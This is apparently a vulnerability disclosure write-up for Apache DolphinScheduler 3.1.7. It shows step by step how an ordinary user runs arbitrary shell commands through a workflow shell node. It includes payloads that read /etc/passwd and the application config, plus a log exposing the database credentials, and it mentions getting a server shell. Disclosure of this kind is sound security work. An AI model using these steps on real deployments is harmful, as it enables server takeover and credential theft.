# DolphinScheduler  introduction
Apache DolphinScheduler is a distributed and easily extensible open source system for visual DAG workflow task scheduling. Applicable to enterprise-level scenarios, it provides a solution for visualizing operational tasks, workflows, and data processing processes throughout the life cycle.

**Reproduce the environment**

DolphinScheduler version:3.1.7

OS:Linux/Ubuntu

Deployment method:docker-compose

![](pic/Pasted%20image%2020230615155445.png)

# Vulnerability overview

After ordinary users log in to the system, they can execute arbitrary commands, view server files, and even take over the server by using workflow and task examples

# Vulnerability details

Log in to the system as a common user admin1
![](pic/Pasted%20image%2020230615155647.png)
Go to Project - Workflow Definition - Create Workflow
![](pic/Pasted%20image%2020230615155835.png)
Create a shell node
![](pic/Pasted%20image%2020230615155914.png)
Fill in the payload at the script：`cat /etc/passwd`
![](pic/Pasted%20image%2020230615160805.png)
Save
![](pic/Pasted%20image%2020230615160032.png)
![](pic/Pasted%20image%2020230615160442.png)
Click Go Live and Run
![](pic/Pasted%20image%2020230615160518.png)
Through the log function in the task instance, you can see the command execution results
![](pic/Pasted%20image%2020230615160619.png)
Through the log, you can determine that the command was executed successfully
![](pic/Pasted%20image%2020230615160925.png)
Further use, modify the command, you can query the configuration file information of dolphinscheduler
![](pic/Pasted%20image%2020230615162312.png)
View profile information
![](pic/Pasted%20image%2020230615162934.png)

The detailed log information is as follows：

```log
[LOG-PATH]: /opt/dolphinscheduler/logs/20230615/9905261601664_3-2-8.log, [HOST]:  Host{address='172.18.0.7:1234', ip='172.18.0.7', port=1234}

[INFO] 2023-06-15 08:28:23.333 +0000 - Begin to pulling task

[INFO] 2023-06-15 08:28:23.334 +0000 - Begin to initialize task

[INFO] 2023-06-15 08:28:23.334 +0000 - Set task startTime: Thu Jun 15 08:28:23 UTC 2023

[INFO] 2023-06-15 08:28:23.334 +0000 - Set task envFile: /opt/dolphinscheduler/conf/dolphinscheduler_env.sh

[INFO] 2023-06-15 08:28:23.334 +0000 - Set task appId: 2_8

[INFO] 2023-06-15 08:28:23.335 +0000 - End initialize task

[INFO] 2023-06-15 08:28:23.335 +0000 - Set task status to TaskExecutionStatus{code=1, desc='running'}

[INFO] 2023-06-15 08:28:23.335 +0000 - TenantCode:a check success

[INFO] 2023-06-15 08:28:23.336 +0000 - ProcessExecDir:/tmp/dolphinscheduler/exec/process/a/9905222877696/9905261601664_3/2/8 check success

[INFO] 2023-06-15 08:28:23.336 +0000 - Resources:{} check success

[INFO] 2023-06-15 08:28:23.336 +0000 - Task plugin: SHELL create success

[INFO] 2023-06-15 08:28:23.336 +0000 - shell task params {"localParams":[],"rawScript":"cat /opt/dolphinscheduler/conf/application.yaml","resourceList":[]}

[INFO] 2023-06-15 08:28:23.337 +0000 - Success initialized task plugin instance success

[INFO] 2023-06-15 08:28:23.337 +0000 - Success set taskVarPool: []

[INFO] 2023-06-15 08:28:23.338 +0000 - raw script : cat /opt/dolphinscheduler/conf/application.yaml

[INFO] 2023-06-15 08:28:23.338 +0000 - task execute path : /tmp/dolphinscheduler/exec/process/a/9905222877696/9905261601664_3/2/8

[INFO] 2023-06-15 08:28:23.338 +0000 - Begin to create command file:/tmp/dolphinscheduler/exec/process/a/9905222877696/9905261601664_3/2/8/2_8.command

[INFO] 2023-06-15 08:28:23.338 +0000 - Success create command file, command: #!/bin/bash

BASEDIR=$(cd `dirname $0`; pwd)

cd $BASEDIR

source /opt/dolphinscheduler/conf/dolphinscheduler_env.sh

/tmp/dolphinscheduler/exec/process/a/9905222877696/9905261601664_3/2/8/2_8_node.sh

[INFO] 2023-06-15 08:28:23.340 +0000 - task run command: sudo -u a -E bash /tmp/dolphinscheduler/exec/process/a/9905222877696/9905261601664_3/2/8/2_8.command

[INFO] 2023-06-15 08:28:23.341 +0000 - process start, process id is: 1387

[INFO] 2023-06-15 08:28:23.349 +0000 - process has exited. execute path:/tmp/dolphinscheduler/exec/process/a/9905222877696/9905261601664_3/2/8, processId:1387 ,exitStatusCode:0 ,processWaitForStatus:true ,processExitValue:0

[INFO] 2023-06-15 08:28:23.350 +0000 - Send task execute result to master, the current task status: TaskExecutionStatus{code=7, desc='success'}

[INFO] 2023-06-15 08:28:23.350 +0000 - Remove the current task execute context from worker cache

[INFO] 2023-06-15 08:28:23.350 +0000 - The current execute mode isn't develop mode, will clear the task execute file: /tmp/dolphinscheduler/exec/process/a/9905222877696/9905261601664_3/2/8

[INFO] 2023-06-15 08:28:23.351 +0000 - Success clear the task execute file: /tmp/dolphinscheduler/exec/process/a/9905222877696/9905261601664_3/2/8

[INFO] 2023-06-15 08:28:24.341 +0000 -  -> #

    # Licensed to the Apache Software Foundation (ASF) under one or more

    # contributor license agreements.  See the NOTICE file distributed with

    # this work for additional information regarding copyright ownership.

    # The ASF licenses this file to You under the Apache License, Version 2.0

    # (the "License"); you may not use this file except in compliance with

    # the License.  You may obtain a copy of the License at

    #

    #     http://www.apache.org/licenses/LICENSE-2.0

    #

    # Unless required by applicable law or agreed to in writing, software

    # distributed under the License is distributed on an "AS IS" BASIS,

    # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.

    # See the License for the specific language governing permissions and

    # limitations under the License.

    #

    spring:

      banner:

        charset: UTF-8

      jackson:

        time-zone: UTC

        date-format: "yyyy-MM-dd HH:mm:ss"

      datasource:

        driver-class-name: org.postgresql.Driver

        url: jdbc:postgresql://127.0.0.1:5432/dolphinscheduler

        username: root

        password: root

        hikari:

          connection-test-query: select 1

          minimum-idle: 5

          auto-commit: true

          validation-timeout: 3000

          pool-name: DolphinScheduler

          maximum-pool-size: 50

          connection-timeout: 30000

          idle-timeout: 600000

          leak-detection-threshold: 0

          initialization-fail-timeout: 1

    registry:

      type: zookeeper

      zookeeper:

        namespace: dolphinscheduler

        connect-string: localhost:2181

        retry-policy:

          base-sleep-time: 60ms

          max-sleep: 300ms

          max-retries: 5

        session-timeout: 30s

        connection-timeout: 9s

        block-until-connected: 600ms

        digest: ~

    worker:

      # worker listener port

      listen-port: 1234

      # worker execute thread number to limit task instances in parallel

      exec-threads: 100

      # worker heartbeat interval

      heartbeat-interval: 10s

      # worker host weight to dispatch tasks, default value 100

      host-weight: 100

      # tenant corresponds to the user of the system, which is used by the worker to submit the job. If system does not have this user, it will be automatically created after the parameter worker.tenant.auto.create is true.

      tenant-auto-create: true

      #Scenes to be used for distributed users.For example,users created by FreeIpa are stored in LDAP.This parameter only applies to Linux, When this parameter is true, worker.tenant.auto.create has no effect and will not automatically create tenants.

      tenant-distributed-user: false

      # worker max cpuload avg, only higher than the system cpu load average, worker server can be dispatched tasks. default value -1: the number of cpu cores * 2

      max-cpu-load-avg: -1

      # worker reserved memory, only lower than system available memory, worker server can be dispatched tasks. default value 0.3, the unit is G

      reserved-memory: 0.3

      # alert server listen host

      alert-listen-host: localhost

      alert-listen-port: 50052

      registry-disconnect-strategy:

        # The disconnect strategy: stop, waiting

        strategy: waiting

        # The max waiting time to reconnect to registry if you set the strategy to waiting

        max-waiting-time: 100s

      task-execute-threads-full-policy: REJECT

    server:

      port: 1235

    management:

      endpoints:

        web:

          exposure:

            include: '*'

      endpoint:

        health:

          enabled: true

          show-details: always

      health:

        db:

          enabled: true

        defaults:

          enabled: false

      metrics:

        tags:

          application: ${spring.application.name}

    metrics:

      enabled: true

    # Override by profile

    ---

    spring:

      config:

        activate:

          on-profile: mysql

      datasource:

        driver-class-name: com.mysql.cj.jdbc.Driver

        url: jdbc:mysql://127.0.0.1:3306/dolphinscheduler

        username: root

        password: root

[INFO] 2023-06-15 08:28:24.342 +0000 - FINALIZE_SESSION
```

You can also get the server shell through the bash command, and the payload needs to be url-encoded
![](pic/Pasted%20image%2020230615174532.png)

Get the server shell
![](pic/Pasted%20image%2020230615174600.png)